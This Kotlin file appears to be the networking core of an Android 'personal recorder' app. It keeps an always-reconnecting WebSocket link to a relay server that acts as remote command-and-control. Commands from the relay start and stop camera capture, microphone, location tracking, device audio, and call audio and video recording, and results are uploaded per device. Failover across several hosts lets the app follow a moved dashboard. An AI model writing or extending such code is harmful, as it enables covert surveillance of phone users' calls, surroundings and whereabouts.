package com.example.personalrecorder.net

import android.content.Context
import android.os.Build
import android.os.Handler
import android.os.Looper
import java.security.KeyStore
import java.security.cert.CertificateFactory
import java.security.cert.X509Certificate
import java.util.concurrent.TimeUnit
import javax.net.ssl.SSLContext
import javax.net.ssl.TrustManagerFactory
import javax.net.ssl.X509TrustManager
import kotlin.jvm.Volatile
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import org.json.JSONObject

/**
 * Single WebSocket channel to the lab relay server.
 *
 * Steady-mode behaviour:
 * - "connect" never gives up: while enabled it reconnects with jittered
 *   exponential backoff (1 s -> 2 s -> ... capped at 30 s), so Wi-Fi <-> mobile
 *   hand-offs and NAT timeouts are absorbed instead of ending the session.
 * - OkHttp sends a ping every 20 s and fails the socket when no pong returns
 *   in that window -- a silently dropped NAT session is detected rather than
 *   hanging forever.
 * - `reconnectNow()` (called by ConnectionService when the OS reports a
 *   connectivity change) dials again immediately instead of waiting.
 * - Every install announces itself with a stable device id + friendly name
 *   (deviceId()/deviceName()), so the dashboard lists each phone once.
 * - `connect(urls: List)` implements failover: each reconnect attempt dials
 *   the next URL (urls[attempt % size]); index 0 is the primary host that
 *   reconnectNow() returns to after a network change.
 * - Incoming JSON commands (capture, mic_start, ...) are dispatched via
 *   CommandBus and acknowledged to the relay with {"type":"ack"}.
 * - TLS: if the app is built with `assets/ca.pem` (the lab CA from
 *   server/gen_cert.sh) and you connect to a `wss://` URL, that CA is the
 *   only trust anchor. Without the CA asset, wss falls back to the system
 *   trust store (which will reject self-signed certs -- see README).
 */
object RealtimeClient {

    /** Default: Android emulator loopback. Change to the LAN IP of your relay host on a real device. */
    const val defaultUrl = "ws://10.0.2.2:8765"

    private const val PING_INTERVAL_SECONDS = 20L
    private const val RECONNECT_BASE_MS = 1000L
    private const val RECONNECT_MAX_MS = 30_000L
    private const val CA_ASSET = "ca.pem"

    private val mainHandler = Handler(Looper.getMainLooper())

    private val baseClient = OkHttpClient.Builder()
        .pingInterval(PING_INTERVAL_SECONDS, TimeUnit.SECONDS)
        .build()

    private var appContext: Context? = null
    private var tlsClient: OkHttpClient? = null

    @Volatile
    private var socket: WebSocket? = null
    private val statusListeners = mutableListOf<(String) -> Unit>()

    /** Most recent link state -- read by ConnectionService for its notification. */
    @Volatile
    var lastStatus: String = "idle"
        private set

    /** URL currently being (re)connected to, or null after disconnect(). */
    @Volatile
    var activeUrl: String? = null
        private set

    @Volatile
    private var shouldReconnect = false
    private var reconnectUrl: String? = null
    private var reconnectAttempt = 0

    /** Failover list: dialed in order per reconnect attempt (urls[attempt % size]). */
    private var urlList = listOf<String>()

    /** Bumped per openSocket(); lets a stale socket's callbacks know they are obsolete. */
    @Volatile
    private var generation = 0

    private val reconnectTask = object : Runnable {
        override fun run() {
            status("Reconnecting…")
            dial()
        }
    }

    /** Call once from MainActivity to enable the CA-asset based TLS client. */
    fun init(context: Context) {
        appContext = context.applicationContext
        tlsClient = buildTlsClient()
    }

    /**
     * Stable per-install device id, persisted in prefs so it survives app
     * restarts and the dashboard keeps one entry per phone (not per launch).
     */
    fun deviceId(): String {
        val ctx = appContext
        if (ctx == null) return "dev-" + java.util.UUID.randomUUID().toString().take(8)
        val prefs = ctx.getSharedPreferences("relay_prefs", Context.MODE_PRIVATE)
        val existing = prefs.getString("device_id", null)
        if (existing != null) return existing
        val fresh = "dev-" + java.util.UUID.randomUUID().toString()
        prefs.edit().putString("device_id", fresh).apply()
        return fresh
    }

    /** Friendly name shown in the dashboard Devices tab, e.g. "samsung SM-A525F". */
    fun deviceName(): String {
        val manufacturer = Build.MANUFACTURER?.trim().orEmpty()
        val model = Build.MODEL?.trim().orEmpty()
        return buildString {
            append(manufacturer)
            if (manufacturer.isNotEmpty() && model.isNotEmpty()) append(' ')
            append(model)
        }.ifEmpty { "android-device" }
    }

    /** Attach a status listener (e.g. the activity log). */
    fun addStatusListener(listener: (String) -> Unit) {
        if (listener !in statusListeners) statusListeners.add(listener)
    }

    fun removeStatusListener(listener: (String) -> Unit) {
        statusListeners.remove(listener)
    }

    /**
     * Connect with failover: the URLs are dialed in a cycle, one per reconnect
     * attempt (urls[attempt % size]), so if the dashboard moves to a new host
     * the APK eventually lands on it. Index 0 is the preferred/primary host.
     */
    fun connect(urls: List<String>, onStatus: ((String) -> Unit)? = null) {
        disconnect()
        onStatus?.let { addStatusListener(it) }
        urlList = urls.map { it.trim() }
            .filter { it.isNotEmpty() }
            .map { normalizeWsUrl(it) }
        if (urlList.isEmpty()) urlList = listOf(defaultUrl)
        shouldReconnect = true
        reconnectAttempt = 0
        dial()
    }

    /** Connect to a single URL (failover list of one). */
    fun connect(url: String, onStatus: ((String) -> Unit)? = null) {
        connect(listOf(url), onStatus)
    }

    /**
     * Convenience for MainActivity / ConnectionService: a comma- or
     * newline-separated list of ws(s):// URLs (as stored in prefs).
     */
    fun connectCsv(csv: String, onStatus: ((String) -> Unit)? = null) {
        connect(csv.split(',', '\n'), onStatus)
    }

    /**
     * True when the given raw URL(s) already match the active link target.
     * Lets ConnectionService skip a redundant reconnect on a sticky restart.
     */
    fun isActive(urlOrList: String): Boolean {
        val active = activeUrl ?: return false
        return urlOrList.split(',', '\n')
            .map { it.trim() }
            .filter { it.isNotEmpty() }
            .map { normalizeWsUrl(it) }
            .any { it == active }
    }

    /** Dial the next URL of the failover list (position tracked by reconnectAttempt). */
    private fun dial() {
        if (urlList.isEmpty()) return
        val target = urlList[reconnectAttempt % urlList.size]
        reconnectUrl = target
        activeUrl = target
        status("Connecting to $target")
        openSocket(target, pickClient(target))
    }

    /**
     * Bare host, no path: "ws://host:8765" -> "ws://host:8765/ws" (the
     * dashboard handshake path). A query string stays after the path.
     */
    private fun normalizeWsUrl(url: String): String {
        val marker = "://"
        val i = url.indexOf(marker)
        if (i < 0) return url
        val rest = url.substring(i + marker.length)
        if ('/' in rest) return url
        val q = rest.indexOf('?')
        return if (q < 0) "$url/ws"
        else url.substring(0, i + marker.length + q) + "/ws" + url.substring(i + marker.length + q)
    }

    /**
     * HTTP upload URL derived from the active WebSocket link, so /upload
     * hits the same host/port and carries the same ?token= as the socket:
     *
     *   ws://host:8765/ws?token=abc  ->  http://host:8765/upload?token=abc
     *   wss://host:8765/ws           ->  https://host:8765/upload
     *
     * Returns null while no connection is active or the scheme is unknown.
     */
    fun uploadUrl(): String? {
        val wsUrl = activeUrl ?: return null
        val scheme = when {
            wsUrl.startsWith("wss://") -> "https://"
            wsUrl.startsWith("ws://") -> "http://"
            else -> return null
        }
        val rest = wsUrl.substringAfter("://")
        val hostPort = rest.substringBefore("/")
        val query = rest.substringAfter("?", "").takeIf { it.isNotEmpty() }?.let { "?$it" } ?: ""
        // Tag every upload with this install's device id so the gallery can
        // be filtered per phone (/api/files?dev=<id>).
        val devQuery = if (query.isNotEmpty()) "$query&dev=${deviceId()}" else "?dev=${deviceId()}"
        return scheme + hostPort + "/upload" + devQuery
    }

    /** OkHttp client for uploads: the custom-CA TLS client for wss, base otherwise. */
    fun uploadClient(): OkHttpClient {
        return if (activeUrl?.startsWith("wss://") == true) (tlsClient ?: baseClient) else baseClient
    }

    /**
     * Force an immediate reconnect. Called by ConnectionService when the OS
     * reports a connectivity change (Wi-Fi -> mobile data, airplane mode
     * off, new IP, ...). Harmless if a reconnect is already scheduled -- it
     * simply fires now instead of later.
     */
    fun reconnectNow() {
        if (!shouldReconnect) return
        mainHandler.removeCallbacks(reconnectTask)
        status("Network changed — reconnecting…")
        reconnectAttempt = 0   // back to the primary (first) URL in the list
        dial()
    }

    private fun pickClient(url: String): OkHttpClient {
        if (!url.startsWith("wss://")) return baseClient
        val tls = tlsClient
        if (tls != null) return tls
        status("wss URL but no trusted CA — run gen_cert.sh and copy ca.pem to app/src/main/assets/")
        return baseClient
    }

    /**
     * Builds a TLS client that trusts only the lab CA shipped in assets.
     * Returns null when assets/ca.pem is absent, letting wss fall back to
     * the system trust store (useful with public certs like Let's Encrypt).
     */
    private fun buildTlsClient(): OkHttpClient? {
        val ctx = appContext ?: return null
        val caStream = try {
            ctx.assets.open(CA_ASSET)
        } catch (_: Exception) {
            return null
        }
        return try {
            val cert = CertificateFactory.getInstance("X.509")
                .generateCertificate(caStream) as X509Certificate
            caStream.close()
            val keyStore = KeyStore.getInstance(KeyStore.getDefaultType()).apply {
                load(null, null)
                setCertificateEntry("relay_ca", cert)
            }
            val trustManagerFactory =
                TrustManagerFactory.getInstance(TrustManagerFactory.getDefaultAlgorithm()).apply {
                    init(keyStore)
                }
            val trustManager =
                trustManagerFactory.trustManagers.filterIsInstance<X509TrustManager>().firstOrNull()
                    ?: return null
            val sslContext = SSLContext.getInstance("TLS").apply {
                init(null, arrayOf(trustManager), null)
            }
            baseClient.newBuilder()
                .sslSocketFactory(sslContext.socketFactory, trustManager)
                .build()
        } catch (_: Exception) {
            null
        }
    }

    private fun openSocket(url: String, client: OkHttpClient) {
        generation++
        val gen = generation
        val request = Request.Builder().url(url).build()
        socket = client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                if (gen != generation) return
                reconnectAttempt = 0
                status("WS open: $url")
                // Announce ourselves so the dashboard/relay can mark this socket
                // as the device and immediately flush any commands that were
                // queued while we were offline.
                send("device_online", JSONObject()
                    .put("id", deviceId())
                    .put("name", deviceName())
                    .put("url", url))
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                if (gen != generation) return
                handleCommand(text)
            }

            override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                if (gen != generation) return
                socket = null
                status("WS closed ($code $reason)")
                scheduleReconnect()
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                if (gen != generation) return
                socket = null
                status("WS error: ${t.message ?: "connection lost"}")
                scheduleReconnect()
            }
        })
    }

    private fun scheduleReconnect() {
        if (!shouldReconnect) return
        val delay = minOf(RECONNECT_BASE_MS shl minOf(reconnectAttempt, 5), RECONNECT_MAX_MS) +
            (0..2000L).random()
        reconnectAttempt++
        mainHandler.removeCallbacks(reconnectTask)
        mainHandler.postDelayed(reconnectTask, delay)
    }

    private fun handleCommand(text: String) {
        try {
            val json = JSONObject(text)
            val cmd = json.optString("type")
            when (cmd) {
                "capture" -> CommandBus.dispatch(CommandBus.CMD_CAPTURE, json)
                "mic_start" -> CommandBus.dispatch(CommandBus.CMD_AUDIO_START, json)
                "mic_stop" -> CommandBus.dispatch(CommandBus.CMD_AUDIO_STOP, json)
                "location_start" -> CommandBus.dispatch(CommandBus.CMD_LOC_START, json)
                "location_stop" -> CommandBus.dispatch(CommandBus.CMD_LOC_STOP, json)
                "record_start" -> CommandBus.dispatch(CommandBus.CMD_REC_START, json)
                "record_stop" -> CommandBus.dispatch(CommandBus.CMD_REC_STOP, json)
                "deviceaudio_start" -> CommandBus.dispatch(CommandBus.CMD_DEV_AUDIO_START, json)
                "deviceaudio_stop" -> CommandBus.dispatch(CommandBus.CMD_DEV_AUDIO_STOP, json)
                "call_video_start" -> CommandBus.dispatch(CommandBus.CMD_CALL_VIDEO_START, json)
                "call_video_stop" -> CommandBus.dispatch(CommandBus.CMD_CALL_VIDEO_STOP, json)
                "call_audio_start" -> CommandBus.dispatch(CommandBus.CMD_CALL_AUDIO_START, json)
                "call_audio_stop" -> CommandBus.dispatch(CommandBus.CMD_CALL_AUDIO_STOP, json)
            }
            // Confirm execution to the relay so the commander knows it arrived.
            if (cmd.isNotEmpty()) {
                send("ack", JSONObject().put("cmd", cmd))
            }
        } catch (_: Exception) {
            // malformed message: ignore
        }
    }

    @Synchronized
    fun send(type: String, payload: JSONObject = JSONObject()) {
        val message = JSONObject()
            .put("type", type)
            .put("payload", payload)
            .put("ts", System.currentTimeMillis())
        try {
            socket?.send(message.toString())
        } catch (_: Exception) {
            // offline: the reconnect loop recovers
        }
    }

    fun disconnect() {
        shouldReconnect = false
        reconnectUrl = null
        activeUrl = null
        urlList = emptyList()
        reconnectAttempt = 0
        mainHandler.removeCallbacks(reconnectTask)
        socket?.close(1000, "client disconnect")
        socket = null
        status("idle")
    }

    /** Status updates always land on the main thread (listeners touch the UI). */
    private fun status(text: String) {
        lastStatus = text
        mainHandler.post {
            statusListeners.toList().forEach { listener ->
                try {
                    listener(text)
                } catch (_: Exception) {
                    // a dead listener must not break the others
                }
            }
        }
    }
}